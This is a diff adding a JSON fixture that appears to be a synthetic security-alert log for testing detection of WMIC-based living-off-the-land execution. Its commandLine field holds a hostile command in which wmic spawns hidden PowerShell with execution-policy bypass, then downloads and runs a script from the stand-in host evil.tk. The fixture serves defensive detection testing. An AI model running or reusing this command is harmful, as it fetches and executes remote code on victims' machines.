@@ -1,0 +1,31 @@
+{
+  "timestamp": "2025-08-19T13:12:53.658251Z",
+  "rule": {
+    "id": 18152,
+    "level": 10,
+    "description": "Test log for lol_03_wmic_execution",
+    "groups": [
+      "test",
+      "windows"
+    ]
+  },
+  "agent": {
+    "id": "001",
+    "name": "WIN-WORKSTATION01",
+    "ip": "192.168.1.100"
+  },
+  "win": {
+    "system": {
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "WIN-WORKSTATION01"
+    },
+    "eventdata": {
+      "commandLine": "wmic process call create \"powershell.exe -exec bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.tk/script.ps1')\"",
+      "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "parentImage": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  "location": "EventChannel",
+  "full_log": "Test log entry for lol_03_wmic_execution scenario"
+}
